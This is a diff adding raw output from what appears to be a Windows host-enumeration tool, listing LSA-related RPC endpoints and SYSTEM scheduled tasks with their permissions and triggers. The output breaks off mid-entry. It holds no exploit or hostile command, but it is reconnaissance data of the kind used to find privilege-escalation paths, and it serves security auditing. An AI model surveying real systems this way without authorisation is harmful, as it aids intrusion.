+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[imsfk]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49664]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49669]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[clipsfk]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[imsfk]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49664]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49669]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[clipsfk]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[imsfk]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_np:[\\pipe\\lsass]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[audit]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[securityevent]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSARPC_ENDPOINT]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsacap]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_IDPEXT_ENDPOINT]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_EAS_ENDPOINT]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsapolicylookup]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsasspirpc]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[protected_storage]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[SidKey Local End Point]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[samss lpc]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_ip_tcp:[49664]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[NETLOGON_LRPC]
+  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_ip_tcp:[49669]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[clipsfk]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[imsfk]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49664]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
+  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49669]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[clipsfk]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[imsfk]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49664]
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
+====== SCCM ======
+
+  Server                         : 
+  SiteCode                       : 
+  ProductVersion                 : 
+  LastSuccessfulInstallParams    : 
+
+====== ScheduledTasks ======
+
+Non Microsoft scheduled tasks (via WMI)
+
+  Name                              :   .NET Framework NGEN v4.0.30319
+  Principal                         :
+      GroupId                       :   
+      Id                            :   Author
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
+  Enabled                           :   True
+  Date                              :   9/30/2010 2:53:37 PM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT2H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {84F0FAE1-C27B-4F6F-807B-28CF6F96287D}
+      Data                          :   /RuntimeWide
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   .NET Framework NGEN v4.0.30319 64
+  Principal                         :
+      GroupId                       :   
+      Id                            :   Author
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
+  Enabled                           :   True
+  Date                              :   9/30/2010 2:53:37 PM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT2H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {429BC048-379E-45E0-80E4-EB1977941B5C}
+      Data                          :   /RuntimeWide
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   .NET Framework NGEN v4.0.30319 64 Critical
+  Principal                         :
+      GroupId                       :   
+      Id                            :   Author
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
+  Enabled                           :   False
+  Date                              :   9/30/2010 2:53:37 PM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT2H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {613FBA38-A3DF-4AB8-9674-5604984A299A}
+      Data                          :   /RuntimeWide
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskIdleTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   .NET Framework NGEN v4.0.30319 Critical
+  Principal                         :
+      GroupId                       :   
+      Id                            :   Author
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
+  Enabled                           :   False
+  Date                              :   9/30/2010 2:53:37 PM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT2H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {DE434264-8FE9-4C0B-A83B-89EBEEBFF78E}
+      Data                          :   /RuntimeWide
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskIdleTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   Backup
+  Principal                         :
+      GroupId                       :   Users
+      Id                            :   AnyUser
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-600)
+  Description                       :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-602)
+  Source                            :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-601)
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {E0DCC2CC-3354-45F2-8914-519E07809082}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   BackupNonMaintenance
+  Principal                         :
+      GroupId                       :   Users
+      Id                            :   AnyUser
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-600)
+  Description                       :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-602)
+  Source                            :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-601)
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {E0DCC2CC-3354-45F2-8914-519E07809082}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskDailyTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2022-01-01T00:00:00
+      StopAtDurationEnd             :   False
+      DaysInterval                  :   14
+      RandomDelay                   :   PT4H
+      ------------------------------
+
+  Name                              :   Pre-staged app cleanup
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
+      Execute                       :   %windir%\system32\rundll32.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskLogonTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      Delay                         :   PT1H
+      ------------------------------
+
+  Name                              :   BitLocker Encrypt All Drives
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
+      Data                          :   BitLockerEncryptAllDrives
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   BitLocker MDM policy Refresh
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
+      Data                          :   BitLockerPolicy
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   SyspartRepair
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FR;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   %windir% /sysrepair
+      Execute                       :   %windir%\system32\bcdboot.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   CreateObjectTask
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;IU)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT1H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {E4544ABA-62BF-4C54-AAB2-EC246342626C}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   UnifiedConsentSyncTask
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   InteractiveUsers
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   $(@%systemRoot%\system32\unifiedconsent.dll,-102)
+  Description                       :   $(@%systemRoot%\system32\unifiedconsent.dll,-101)
+  Source                            :   $(@%systemRoot%\system32\unifiedconsent.dll,-103)
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT5M
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {82AA0895-198A-4C1B-B2D1-C16894218AFB}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskTimeTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2024-03-26T12:00:00
+      Interval                      :   P1D
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   Device
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   P4D
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   SystemCxt
+      Execute                       :   %windir%\system32\devicecensus.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTimeTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2008-09-01T03:00:00
+      Interval                      :   P1D
+      StopAtDurationEnd             :   False
+      RandomDelay                   :   PT2H
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   False
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   Device User
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   P4D
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   UserCxt
+      Execute                       :   %windir%\system32\devicecensus.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskLogonTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      Delay                         :   PT2M
+      ------------------------------
+
+  Name                              :   DirectXDatabaseUpdater
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   False
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT2H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Execute                       :   %windir%\system32\directxdatabaseupdater.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskLogonTrigger
+      Enabled                       :   False
+      StopAtDurationEnd             :   False
+      Delay                         :   PT10M
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   DXGIAdapterCache
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   False
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Execute                       :   %windir%\system32\dxgiadaptercache.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskBootTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      Delay                         :   PT1M
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   Diagnostics
+  Principal                         :
+      GroupId                       :   
+      Id                            :   System
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT1H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   -z
+      Execute                       :   %windir%\system32\disksnapshot.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   StorageSense
+  Principal                         :
+      GroupId                       :   
+      Id                            :   System
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
